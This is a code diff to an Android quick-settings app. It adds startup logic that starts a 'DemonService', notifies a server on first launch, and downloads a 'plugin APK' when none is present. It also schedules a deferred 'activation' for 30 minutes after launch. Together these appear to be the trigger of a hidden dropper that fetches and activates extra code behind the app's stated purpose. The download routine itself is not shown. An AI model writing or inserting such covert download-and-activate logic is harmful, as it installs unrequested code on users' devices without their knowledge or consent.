@@ -25,6 +25,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
 
+import android.text.TextUtils;
 import com.bwx.bequick.Constants;
 import com.bwx.bequick.fwk.Setting;
 import com.bwx.bequick.fwk.SettingsFactory;
@@ -90,12 +91,26 @@ public class QuickSettingApplication extends Application {
         Config.LOGD("[[QuickSettingApplication::onCreate]] create APP :::::::");
 
         long launchTime = SettingManager.getInstance().getKeyLanuchTime();
-        if (launchTime == 0) {
+        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
             //first lanuch
-            //TODO: 设置启动的时间，需要通知服务器第一次启动
+
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
+            }
+
             Intent i = new Intent();
             i.setClass(getApplicationContext(), DemonService.class);
             i.setAction(DemonService.ACTION_LANUCH);
+            startService(i);
+        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
+                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
+            }
+
+            Intent i = new Intent();
+            i.setClass(getApplicationContext(), DemonService.class);
+            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
             startService(i);
         }
 
@@ -105,10 +120,11 @@ public class QuickSettingApplication extends Application {
             //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
             if (deta >= (30 * 60 * 1000)) {
                 //active now
-                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
+//                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
+                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
             } else {
                 long activeDelay = 30 * 60 * 1000 - deta;
-                UtilOperator.startActiveAlarm(getApplicationContext(), activeDelay);
+                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
             }
         }
 
